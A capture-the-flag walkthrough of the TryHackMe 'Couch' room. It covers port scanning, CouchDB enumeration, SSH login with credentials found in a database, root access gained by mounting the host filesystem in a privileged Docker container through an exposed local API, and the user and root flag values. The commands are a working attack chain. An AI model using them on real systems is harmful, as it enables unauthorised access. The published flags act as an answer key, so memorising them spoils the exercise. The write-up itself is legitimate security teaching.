# TryHackMe — Couch

![Difficulty](https://img.shields.io/badge/Platform-TryHackMe-red)
![Focus](https://img.shields.io/badge/Focus-CouchDB%20%7C%20Linux%20Privilege%20Escalation-blue)
![Status](https://img.shields.io/badge/Write--up-Completed-brightgreen)

## Overview

This write-up documents my approach to the **Couch** room on TryHackMe, based on the screenshots included in the accompanying ZIP archive.

The attack path is:

1.  Enumerate the target and discover CouchDB on port `5984`.
2.  Explore the exposed CouchDB web interface and discover credentials
    in a document.
3.  Use the recovered credentials to connect over SSH as `atena`.
4.  Inspect the user's shell history and discover a Docker API endpoint
    listening locally on port `2375`.
5.  Use the exposed Docker API to start a privileged container with the
    host filesystem mounted, then read the root flag.


## Attack chain

``` text
Nmap scan
   |
   v
SSH (22) + CouchDB (5984)
   |
   v
Browse CouchDB Futon / inspect databases
   |
   v
Find passwordbackup document in `secret`
   |
   v
SSH as atena
   |
   v
Inspect .bash_history
   |
   v
Discover Docker API at 127.0.0.1:2375
   |
   v
Launch privileged Alpine container with / mounted at /mnt
   |
   v
Read /mnt/root/root.txt
```

## 1. Port scanning and service enumeration

Run a full TCP port scan with service detection:

``` bash
nmap -sV -p- <TARGET_IP>
```

The screenshot shows these open ports:

          Port Service   Finding
  ------------ --------- -------------------------
      `22/tcp` SSH       OpenSSH 7.2p2 on Ubuntu
    `5984/tcp` HTTP      CouchDB 1.6.1

**Screenshot:** `images/1.png`

CouchDB commonly exposes its HTTP API on port `5984`. The next step is
to inspect the web interface and determine whether access controls are
configured correctly.

## 2. Enumerate CouchDB endpoints

Use directory/content discovery against the CouchDB HTTP service:

``` bash
feroxbuster -u http://<TARGET_IP>:5984/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x pdf,txt,log,bak,php,md,zip,jpg,png,jpeg,js,sh \
  -s 200,301,302,303,304,401,403 \
  --scan-dir-listings -t 100
```

The recorded scan identifies CouchDB endpoints including:

-   `/`
-   `/_stats`
-   `/_config`
-   `/_utils/`
-   `/_utils/session.html`

**Screenshot:** `images/2.png`

Open the CouchDB web interface:

``` text
http://<TARGET_IP>:5984/_utils/
```

The interface shows several databases, including `couch` and `secret`.

**Screenshot:** `images/3.png`

## 3. Find credentials in the `secret` database

Open the `secret` database and inspect the document shown in the
screenshot. It contains a field named `passwordbackup` with a username
and password.

**Screenshot:** `images/4.png`

The visible credential is shown in the form:

``` text
atena:<PASSWORD_FROM_DOCUMENT>
```

Use the value from your own lab instance rather than copying a password
from a different run. This is sensitive information exposed through an
unauthenticated or insufficiently protected CouchDB interface.

## 4. Connect to the target over SSH

Use the recovered credentials to connect as `atena`:

``` bash
ssh atena@<TARGET_IP>
```

After authenticating, verify the account:

``` bash
id
```

The screenshot confirms a shell as `atena` on Ubuntu 16.04.7 LTS.

**Screenshot:** `images/5.png`

## 5. Retrieve the user flag

List the home directory and read the user flag:

``` bash
ls
cat user.txt
```

The screenshot shows the user flag:

``` text
THM{1ns3cure_couchdb}
```

**Screenshot:** `images/6.png`

## 6. Check sudo permissions and inspect the home directory

Check whether the current account can run commands with `sudo`:

``` bash
sudo -l
```

The screenshot shows that `atena` is not allowed to run sudo commands.
Continue by listing hidden files:

``` bash
ls -la
```

The directory contains `.bash_history`, which is useful for
understanding commands previously run by the account.

**Screenshot:** `images/7.png`

## 7. Inspect `.bash_history`

Read the shell history:

``` bash
cat .bash_history
```

The history includes a command that contacts a Docker API listening on
localhost port `2375`:

``` bash
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

This is the key finding. An accessible Docker API can be dangerous when
it allows a user to create privileged containers and mount the host
filesystem.

**Screenshots:** `images/8.png`, `images/9.png`

## 8. Use the exposed Docker API

Run the command shown in the shell history:

``` bash
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

What the options do:

-   `-H 127.0.0.1:2375` --- connects to the Docker API on localhost port
    `2375`.
-   `run` --- creates and starts a container.
-   `--rm` --- removes the container when it exits.
-   `-it` --- allocates an interactive terminal.
-   `--privileged` --- grants the container extensive privileges.
-   `--net=host` --- uses the host's network namespace.
-   `-v /:/mnt` --- mounts the host root filesystem at `/mnt` inside the
    container.
-   `alpine` --- uses the Alpine Linux image.

Inside the container, check the current identity:

``` sh
whoami
```

The screenshot shows:

``` text
root
```

**Screenshot:** `images/10.png`

Because the host filesystem is mounted at `/mnt`, the host's root
directory is accessible through `/mnt` from inside the container.

## 9. Retrieve the root flag

Inside the container, locate and read the root flag:

``` sh
find / -name root.txt 2>/dev/null
cat /mnt/root/root.txt
```

The screenshot shows the root flag:

``` text
THM{RCE_using_Docker_API}
```

**Screenshot:** `images/11.png`

## Flags

  Flag   Value
  ------ -----------------------------
  User   `THM{1ns3cure_couchdb}`
  Root   `THM{RCE_using_Docker_API}`

